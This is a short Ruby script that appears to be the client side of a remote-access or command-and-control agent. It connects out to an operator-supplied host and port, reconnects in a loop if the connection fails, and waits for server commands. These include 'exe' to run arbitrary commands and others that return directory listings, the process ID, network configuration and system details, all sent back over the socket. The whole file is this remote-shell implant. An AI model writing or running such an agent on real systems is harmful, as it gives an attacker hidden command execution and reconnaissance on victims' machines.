#!/usr/bin/env ruby

require_relative "helpers.rb"

def handle_client(client)
  loop do
    result = ''
    data = client.recv(1024)
    next if data.nil?
    cmd, action = data.split ' '
    case cmd
    when 'heartbeat'
      result = 'alive'
    when 'exe'
      begin
			  result = Helpers.exe(data.gsub('exe ', ''))
      rescue Exception => e
        puts e.message
				puts e.backtrace
      end
    when 'ls'
      result = Helpers.ls
    when 'pwd'
      result = Helpers.pwd
    when 'pid'
      result = Helpers.pid
    when 'ifconfig'
      result = Helpers.ifconfig
    when 'system'
      result = Helpers.system
    when 'destroy'
      return 42
    end

    result = result.to_s
    client.puts(result.length)
    client.write(result)
  end
end


def main(host, port, timeout)
  # Main loop to repeatedly attempt server connection
  loop do
    client = nil
    begin
      client = TCPSocket.new(host, port)
    rescue Exception => e
      puts e.message
      puts e.backtrace
      sleep(timeout)
    end

    exit_code = 0
    begin
      exit_code = handle_client(client)
    rescue Interrupt
      exit 0
    rescue Exception => e
      puts e.message
      puts e.backtrace
    end

  exit 0 if exit_code == 42
  end
end

host = ARGV[0]
port = ARGV[1]

# If host/port is not passed in ARGV, default to localhost:3200
host ||= "localhost"
port ||= 3200
timeout = 2

main(host, port, timeout)
